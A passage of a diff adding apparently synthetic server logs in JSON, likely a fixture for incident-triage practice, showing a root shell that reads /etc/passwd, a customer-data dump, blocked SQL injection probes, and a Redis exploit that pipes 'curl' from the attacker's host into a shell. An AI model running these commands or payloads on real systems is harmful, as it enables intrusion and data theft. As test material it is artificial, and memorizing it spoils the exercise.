@@ -1,0 +1,1628 @@
+[
+  {
+    "log_id": "LOG-7001",
+    "timestamp": "2026-09-12T11:40:48.567226",
+    "asset_id": "Server-07",
+    "source_ip": "198.51.100.23",
+    "request": "POST /upload/profile-doc.action",
+    "endpoint": "/upload/profile-doc.action",
+    "status_code": 200,
+    "response": "Upload accepted. Processing multipart boundary payload.",
+    "user": "anonymous",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "content_length": 4892,
+      "execution_time_ms": 112
+    }
+  },
+  {
+    "log_id": "LOG-7002",
+    "timestamp": "2026-09-12T11:41:03.567226",
+    "asset_id": "Server-07",
+    "source_ip": "198.51.100.23",
+    "request": "JAVA_EXEC /bin/sh -c 'whoami; id; cat /etc/passwd'",
+    "endpoint": "ProcessBuilder.start()",
+    "status_code": 200,
+    "response": "uid=0(root) gid=0(root) groups=0(root)",
+    "user": "tomcat",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "process_pid": 89412,
+      "parent_pid": 1102
+    }
+  },
+  {
+    "log_id": "LOG-7003",
+    "timestamp": "2026-09-12T11:41:23.567226",
+    "asset_id": "Server-07",
+    "source_ip": "198.51.100.23",
+    "request": "SELECT * FROM customers WHERE account_balance > 100000",
+    "endpoint": "internal_db_pool",
+    "status_code": 200,
+    "response": "1,492 records retrieved without valid API token",
+    "user": "root",
+    "event_type": "DB_QUERY",
+    "details": {
+      "unauthorized": true,
+      "rows": 1492
+    }
+  },
+  {
+    "log_id": "LOG-7004",
+    "timestamp": "2026-09-12T11:41:43.567226",
+    "asset_id": "Server-07",
+    "source_ip": "198.51.100.23",
+    "request": "GET /export/customers_dump.csv",
+    "endpoint": "/export/customers_dump.csv",
+    "status_code": 200,
+    "response": "File transferred (8.4MB)",
+    "user": "root",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "bytes_sent": 8808038
+    }
+  },
+  {
+    "log_id": "LOG-3001",
+    "timestamp": "2026-09-12T11:34:33.567226",
+    "asset_id": "Server-03",
+    "source_ip": "203.0.113.88",
+    "request": "GET /auth/login?user=admin'%20UNION%20SELECT%201,version(),3--",
+    "endpoint": "/auth/login",
+    "status_code": 403,
+    "response": "ModSecurity: Access denied with code 403 (SQLi pattern detected)",
+    "user": "anonymous",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "waf_rule_id": 942100,
+      "blocked": true
+    }
+  },
+  {
+    "log_id": "LOG-3002",
+    "timestamp": "2026-09-12T11:34:38.567226",
+    "asset_id": "Server-03",
+    "source_ip": "203.0.113.88",
+    "request": "GET /auth/login?user=admin'--",
+    "endpoint": "/auth/login",
+    "status_code": 403,
+    "response": "ModSecurity: Access denied with code 403",
+    "user": "anonymous",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "waf_rule_id": 942100,
+      "blocked": true
+    }
+  },
+  {
+    "log_id": "LOG-3003",
+    "timestamp": "2026-09-12T11:34:53.567226",
+    "asset_id": "Server-03",
+    "source_ip": "203.0.113.88",
+    "request": "GET /auth/login",
+    "endpoint": "/auth/login",
+    "status_code": 429,
+    "response": "Rate limit exceeded. Client IP throttled for 10 minutes.",
+    "user": "anonymous",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "rate_limited": true
+    }
+  },
+  {
+    "log_id": "LOG-9001",
+    "timestamp": "2026-09-12T11:26:33.567226",
+    "asset_id": "Server-09",
+    "source_ip": "192.0.2.140",
+    "request": "CONNECT /metrics/push",
+    "endpoint": "/metrics/push",
+    "status_code": 400,
+    "response": "mTLS Handshake Incomplete: client certificate not provided",
+    "user": "anonymous",
+    "event_type": "AUTH_ATTEMPT",
+    "details": {
+      "tls_error": "SSL_ERROR_WANT_READ"
+    }
+  },
+  {
+    "log_id": "LOG-9002",
+    "timestamp": "2026-09-12T11:27:18.567226",
+    "asset_id": "Server-09",
+    "source_ip": "192.0.2.140",
+    "request": "TCP_FIN_WAIT_2",
+    "endpoint": "kernel_sock",
+    "status_code": 0,
+    "response": "Connection reset by peer after 3 failed handshakes",
+    "user": "system",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "session_duration_ms": 120
+    }
+  },
+  {
+    "log_id": "LOG-2001",
+    "timestamp": "2026-09-12T11:48:33.567226",
+    "asset_id": "Server-02",
+    "source_ip": "185.220.101.5",
+    "request": "COMMAND INFO",
+    "endpoint": "redis:6379",
+    "status_code": 200,
+    "response": "+OK",
+    "user": "anonymous",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "command": "INFO"
+    }
+  },
+  {
+    "log_id": "LOG-2002",
+    "timestamp": "2026-09-12T11:48:58.567226",
+    "asset_id": "Server-02",
+    "source_ip": "185.220.101.5",
+    "request": "EVAL 'return os.execute(...)' 0",
+    "endpoint": "redis:6379",
+    "status_code": 200,
+    "response": "Lua script executed successfully. Shell spawned.",
+    "user": "redis",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "spawned_pid": 44102,
+      "command": "curl -s http://185.220.101.5/x.sh | sh"
+    }
+  },
+  {
+    "log_id": "LOG-2003",
+    "timestamp": "2026-09-12T11:49:23.567226",
+    "asset_id": "Server-02",
+    "source_ip": "185.220.101.5",
+    "request": "AUTH MASTER_TOKEN LEAKED",
+    "endpoint": "redis:6379",
+    "status_code": 200,
+    "response": "API Gateway administrative master token written to /tmp/cred_dump",
+    "user": "redis",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "exfiltrated": true
+    }
+  },
+  {
+    "log_id": "LOG-5001",
+    "timestamp": "2026-09-12T11:11:33.567226",
+    "asset_id": "Server-05",
+    "source_ip": "198.51.100.44",
+    "request": "GET /api/v1/jobs/test_probe",
+    "endpoint": "/api/v1/jobs/test_probe",
+    "status_code": 404,
+    "response": "Job ID not found in staging pool.",
+    "user": "anonymous",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "status": "not_found"
+    }
+  },
+  {
+    "log_id": "LOG-5002",
+    "timestamp": "2026-09-12T11:12:13.567226",
+    "asset_id": "Server-05",
+    "source_ip": "198.51.100.44",
+    "request": "POST /api/v1/sync-check",
+    "endpoint": "/api/v1/sync-check",
+    "status_code": 400,
+    "response": "Missing sync token parameter. Rejecting payload.",
+    "user": "anonymous",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "status": "bad_request"
+    }
+  },
+  {
+    "log_id": "LOG-BG-1001",
+    "timestamp": "2026-09-12T11:52:21.567226",
+    "asset_id": "Server-02",
+    "source_ip": "10.0.1.11",
+    "request": "GET /api/v1/service-health?check=1",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 16
+    }
+  },
+  {
+    "log_id": "LOG-BG-1002",
+    "timestamp": "2026-09-12T11:47:09.567226",
+    "asset_id": "Server-03",
+    "source_ip": "10.0.2.12",
+    "request": "GET /api/v1/service-health?check=2",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 17
+    }
+  },
+  {
+    "log_id": "LOG-BG-1003",
+    "timestamp": "2026-09-12T11:41:57.567226",
+    "asset_id": "Server-04",
+    "source_ip": "10.0.3.13",
+    "request": "GET /api/v1/service-health?check=3",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 18
+    }
+  },
+  {
+    "log_id": "LOG-BG-1004",
+    "timestamp": "2026-09-12T11:36:45.567226",
+    "asset_id": "Server-05",
+    "source_ip": "10.0.4.14",
+    "request": "GET /api/v1/service-health?check=4",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 19
+    }
+  },
+  {
+    "log_id": "LOG-BG-1005",
+    "timestamp": "2026-09-12T11:32:33.567226",
+    "asset_id": "Server-06",
+    "source_ip": "10.0.5.15",
+    "request": "GET /api/v1/service-health?check=5",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 20
+    }
+  },
+  {
+    "log_id": "LOG-BG-1006",
+    "timestamp": "2026-09-12T11:27:21.567226",
+    "asset_id": "Server-07",
+    "source_ip": "10.0.6.16",
+    "request": "GET /api/v1/service-health?check=6",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 21
+    }
+  },
+  {
+    "log_id": "LOG-BG-1007",
+    "timestamp": "2026-09-12T11:22:09.567226",
+    "asset_id": "Server-08",
+    "source_ip": "10.0.7.17",
+    "request": "GET /api/v1/service-health?check=7",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 22
+    }
+  },
+  {
+    "log_id": "LOG-BG-1008",
+    "timestamp": "2026-09-12T11:16:57.567226",
+    "asset_id": "Server-09",
+    "source_ip": "10.0.8.18",
+    "request": "GET /api/v1/service-health?check=8",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 23
+    }
+  },
+  {
+    "log_id": "LOG-BG-1009",
+    "timestamp": "2026-09-12T11:11:45.567226",
+    "asset_id": "Server-10",
+    "source_ip": "10.0.9.19",
+    "request": "GET /api/v1/service-health?check=9",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 24
+    }
+  },
+  {
+    "log_id": "LOG-BG-1010",
+    "timestamp": "2026-09-12T11:07:33.567226",
+    "asset_id": "Server-11",
+    "source_ip": "10.0.10.20",
+    "request": "GET /api/v1/service-health?check=10",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 25
+    }
+  },
+  {
+    "log_id": "LOG-BG-1011",
+    "timestamp": "2026-09-12T11:02:21.567226",
+    "asset_id": "Server-12",
+    "source_ip": "10.0.11.21",
+    "request": "GET /api/v1/service-health?check=11",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 26
+    }
+  },
+  {
+    "log_id": "LOG-BG-1012",
+    "timestamp": "2026-09-12T10:57:09.567226",
+    "asset_id": "Server-13",
+    "source_ip": "10.0.12.22",
+    "request": "GET /api/v1/service-health?check=12",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 27
+    }
+  },
+  {
+    "log_id": "LOG-BG-1013",
+    "timestamp": "2026-09-12T10:51:57.567226",
+    "asset_id": "Server-14",
+    "source_ip": "10.0.13.23",
+    "request": "GET /api/v1/service-health?check=13",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 28
+    }
+  },
+  {
+    "log_id": "LOG-BG-1014",
+    "timestamp": "2026-09-12T10:46:45.567226",
+    "asset_id": "Server-15",
+    "source_ip": "10.0.14.24",
+    "request": "GET /api/v1/service-health?check=14",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 29
+    }
+  },
+  {
+    "log_id": "LOG-BG-1015",
+    "timestamp": "2026-09-12T10:42:33.567226",
+    "asset_id": "Server-01",
+    "source_ip": "10.0.15.25",
+    "request": "GET /api/v1/service-health?check=15",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 30
+    }
+  },
+  {
+    "log_id": "LOG-BG-1016",
+    "timestamp": "2026-09-12T10:37:21.567226",
+    "asset_id": "Server-02",
+    "source_ip": "10.0.16.26",
+    "request": "GET /api/v1/service-health?check=16",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 31
+    }
+  },
+  {
+    "log_id": "LOG-BG-1017",
+    "timestamp": "2026-09-12T10:32:09.567226",
+    "asset_id": "Server-03",
+    "source_ip": "10.0.17.27",
+    "request": "GET /api/v1/service-health?check=17",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 32
+    }
+  },
+  {
+    "log_id": "LOG-BG-1018",
+    "timestamp": "2026-09-12T10:26:57.567226",
+    "asset_id": "Server-04",
+    "source_ip": "10.0.18.28",
+    "request": "GET /api/v1/service-health?check=18",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 33
+    }
+  },
+  {
+    "log_id": "LOG-BG-1019",
+    "timestamp": "2026-09-12T10:21:45.567226",
+    "asset_id": "Server-05",
+    "source_ip": "10.0.19.29",
+    "request": "GET /api/v1/service-health?check=19",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 34
+    }
+  },
+  {
+    "log_id": "LOG-BG-1020",
+    "timestamp": "2026-09-12T10:17:33.567226",
+    "asset_id": "Server-06",
+    "source_ip": "10.0.20.30",
+    "request": "GET /api/v1/service-health?check=20",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 35
+    }
+  },
+  {
+    "log_id": "LOG-BG-1021",
+    "timestamp": "2026-09-12T10:12:21.567226",
+    "asset_id": "Server-07",
+    "source_ip": "10.0.21.31",
+    "request": "GET /api/v1/service-health?check=21",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 36
+    }
+  },
+  {
+    "log_id": "LOG-BG-1022",
+    "timestamp": "2026-09-12T10:07:09.567226",
+    "asset_id": "Server-08",
+    "source_ip": "10.0.22.32",
+    "request": "GET /api/v1/service-health?check=22",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 37
+    }
+  },
+  {
+    "log_id": "LOG-BG-1023",
+    "timestamp": "2026-09-12T10:01:57.567226",
+    "asset_id": "Server-09",
+    "source_ip": "10.0.23.33",
+    "request": "GET /api/v1/service-health?check=23",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 38
+    }
+  },
+  {
+    "log_id": "LOG-BG-1024",
+    "timestamp": "2026-09-12T09:56:45.567226",
+    "asset_id": "Server-10",
+    "source_ip": "10.0.24.34",
+    "request": "GET /api/v1/service-health?check=24",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 39
+    }
+  },
+  {
+    "log_id": "LOG-BG-1025",
+    "timestamp": "2026-09-12T09:52:33.567226",
+    "asset_id": "Server-11",
+    "source_ip": "10.0.0.35",
+    "request": "GET /api/v1/service-health?check=25",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 40
+    }
+  },
+  {
+    "log_id": "LOG-BG-1026",
+    "timestamp": "2026-09-12T09:47:21.567226",
+    "asset_id": "Server-12",
+    "source_ip": "10.0.1.36",
+    "request": "GET /api/v1/service-health?check=26",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 41
+    }
+  },
+  {
+    "log_id": "LOG-BG-1027",
+    "timestamp": "2026-09-12T09:42:09.567226",
+    "asset_id": "Server-13",
+    "source_ip": "10.0.2.37",
+    "request": "GET /api/v1/service-health?check=27",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 42
+    }
+  },
+  {
+    "log_id": "LOG-BG-1028",
+    "timestamp": "2026-09-12T09:36:57.567226",
+    "asset_id": "Server-14",
+    "source_ip": "10.0.3.38",
+    "request": "GET /api/v1/service-health?check=28",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 43
+    }
+  },
+  {
+    "log_id": "LOG-BG-1029",
+    "timestamp": "2026-09-12T09:31:45.567226",
+    "asset_id": "Server-15",
+    "source_ip": "10.0.4.39",
+    "request": "GET /api/v1/service-health?check=29",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 44
+    }
+  },
+  {
+    "log_id": "LOG-BG-1030",
+    "timestamp": "2026-09-12T09:27:33.567226",
+    "asset_id": "Server-01",
+    "source_ip": "10.0.5.40",
+    "request": "GET /api/v1/service-health?check=30",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 45
+    }
+  },
+  {
+    "log_id": "LOG-BG-1031",
+    "timestamp": "2026-09-12T09:22:21.567226",
+    "asset_id": "Server-02",
+    "source_ip": "10.0.6.41",
+    "request": "GET /api/v1/service-health?check=31",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 46
+    }
+  },
+  {
+    "log_id": "LOG-BG-1032",
+    "timestamp": "2026-09-12T09:17:09.567226",
+    "asset_id": "Server-03",
+    "source_ip": "10.0.7.42",
+    "request": "GET /api/v1/service-health?check=32",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 47
+    }
+  },
+  {
+    "log_id": "LOG-BG-1033",
+    "timestamp": "2026-09-12T09:11:57.567226",
+    "asset_id": "Server-04",
+    "source_ip": "10.0.8.43",
+    "request": "GET /api/v1/service-health?check=33",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 48
+    }
+  },
+  {
+    "log_id": "LOG-BG-1034",
+    "timestamp": "2026-09-12T09:06:45.567226",
+    "asset_id": "Server-05",
+    "source_ip": "10.0.9.44",
+    "request": "GET /api/v1/service-health?check=34",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 49
+    }
+  },
+  {
+    "log_id": "LOG-BG-1035",
+    "timestamp": "2026-09-12T09:02:33.567226",
+    "asset_id": "Server-06",
+    "source_ip": "10.0.10.45",
+    "request": "GET /api/v1/service-health?check=35",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 401,
+    "response": "Service error or auth required.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 50
+    }
+  },
+  {
+    "log_id": "LOG-BG-1036",
+    "timestamp": "2026-09-12T08:57:21.567226",
+    "asset_id": "Server-07",
+    "source_ip": "10.0.11.46",
+    "request": "GET /api/v1/service-health?check=36",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 51
+    }
+  },
+  {
+    "log_id": "LOG-BG-1037",
+    "timestamp": "2026-09-12T08:52:09.567226",
+    "asset_id": "Server-08",
+    "source_ip": "10.0.12.47",
+    "request": "GET /api/v1/service-health?check=37",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 52
+    }
+  },
+  {
+    "log_id": "LOG-BG-1038",
+    "timestamp": "2026-09-12T08:46:57.567226",
+    "asset_id": "Server-09",
+    "source_ip": "10.0.13.48",
+    "request": "GET /api/v1/service-health?check=38",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 53
+    }
+  },
+  {
+    "log_id": "LOG-BG-1039",
+    "timestamp": "2026-09-12T08:41:45.567226",
+    "asset_id": "Server-10",
+    "source_ip": "10.0.14.49",
+    "request": "GET /api/v1/service-health?check=39",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 54
+    }
+  },
+  {
+    "log_id": "LOG-BG-1040",
+    "timestamp": "2026-09-12T08:37:33.567226",
+    "asset_id": "Server-11",
+    "source_ip": "10.0.15.50",
+    "request": "GET /api/v1/service-health?check=40",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 55
+    }
+  },
+  {
+    "log_id": "LOG-BG-1041",
+    "timestamp": "2026-09-12T08:32:21.567226",
+    "asset_id": "Server-12",
+    "source_ip": "10.0.16.51",
+    "request": "GET /api/v1/service-health?check=41",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 56
+    }
+  },
+  {
+    "log_id": "LOG-BG-1042",
+    "timestamp": "2026-09-12T08:27:09.567226",
+    "asset_id": "Server-13",
+    "source_ip": "10.0.17.52",
+    "request": "GET /api/v1/service-health?check=42",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 57
+    }
+  },
+  {
+    "log_id": "LOG-BG-1043",
+    "timestamp": "2026-09-12T08:21:57.567226",
+    "asset_id": "Server-14",
+    "source_ip": "10.0.18.53",
+    "request": "GET /api/v1/service-health?check=43",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 58
+    }
+  },
+  {
+    "log_id": "LOG-BG-1044",
+    "timestamp": "2026-09-12T08:16:45.567226",
+    "asset_id": "Server-15",
+    "source_ip": "10.0.19.54",
+    "request": "GET /api/v1/service-health?check=44",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 59
+    }
+  },
+  {
+    "log_id": "LOG-BG-1045",
+    "timestamp": "2026-09-12T08:12:33.567226",
+    "asset_id": "Server-01",
+    "source_ip": "10.0.20.55",
+    "request": "GET /api/v1/service-health?check=45",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 60
+    }
+  },
+  {
+    "log_id": "LOG-BG-1046",
+    "timestamp": "2026-09-12T08:07:21.567226",
+    "asset_id": "Server-02",
+    "source_ip": "10.0.21.56",
+    "request": "GET /api/v1/service-health?check=46",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 61
+    }
+  },
+  {
+    "log_id": "LOG-BG-1047",
+    "timestamp": "2026-09-12T08:02:09.567226",
+    "asset_id": "Server-03",
+    "source_ip": "10.0.22.57",
+    "request": "GET /api/v1/service-health?check=47",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 62
+    }
+  },
+  {
+    "log_id": "LOG-BG-1048",
+    "timestamp": "2026-09-12T07:56:57.567226",
+    "asset_id": "Server-04",
+    "source_ip": "10.0.23.58",
+    "request": "GET /api/v1/service-health?check=48",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 63
+    }
+  },
+  {
+    "log_id": "LOG-BG-1049",
+    "timestamp": "2026-09-12T07:51:45.567226",
+    "asset_id": "Server-05",
+    "source_ip": "10.0.24.59",
+    "request": "GET /api/v1/service-health?check=49",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 500,
+    "response": "Service error or auth required.",
+    "user": "service-account-1",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 64
+    }
+  },
+  {
+    "log_id": "LOG-BG-1050",
+    "timestamp": "2026-09-12T07:47:33.567226",
+    "asset_id": "Server-06",
+    "source_ip": "10.0.0.60",
+    "request": "GET /api/v1/service-health?check=50",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-2",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 65
+    }
+  },
+  {
+    "log_id": "LOG-BG-1051",
+    "timestamp": "2026-09-12T07:42:21.567226",
+    "asset_id": "Server-07",
+    "source_ip": "10.0.1.61",
+    "request": "GET /api/v1/service-health?check=51",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 3 healthy.",
+    "user": "service-account-3",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 66
+    }
+  },
+  {
+    "log_id": "LOG-BG-1052",
+    "timestamp": "2026-09-12T07:37:09.567226",
+    "asset_id": "Server-08",
+    "source_ip": "10.0.2.62",
+    "request": "GET /api/v1/service-health?check=52",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 0 healthy.",
+    "user": "service-account-4",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 67
+    }
+  },
+  {
+    "log_id": "LOG-BG-1053",
+    "timestamp": "2026-09-12T07:31:57.567226",
+    "asset_id": "Server-09",
+    "source_ip": "10.0.3.63",
+    "request": "GET /api/v1/service-health?check=53",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 1 healthy.",
+    "user": "service-account-5",
+    "event_type": "HTTP_REQUEST",
+    "details": {
+      "latency_ms": 68
+    }
+  },
+  {
+    "log_id": "LOG-BG-1054",
+    "timestamp": "2026-09-12T07:26:45.567226",
+    "asset_id": "Server-10",
+    "source_ip": "10.0.4.64",
+    "request": "GET /api/v1/service-health?check=54",
+    "endpoint": "/api/v1/service-health",
+    "status_code": 200,
+    "response": "Status checked. Worker 2 healthy.",
+    "user": "service-account-0",
+    "event_type": "SYSTEM_CALL",
+    "details": {
+      "latency_ms": 69
+    }
+  },
+  {
+    "log_id": "LOG-BG-1055",
+    "timestamp": "2026-09-12T07:22:33.567226",
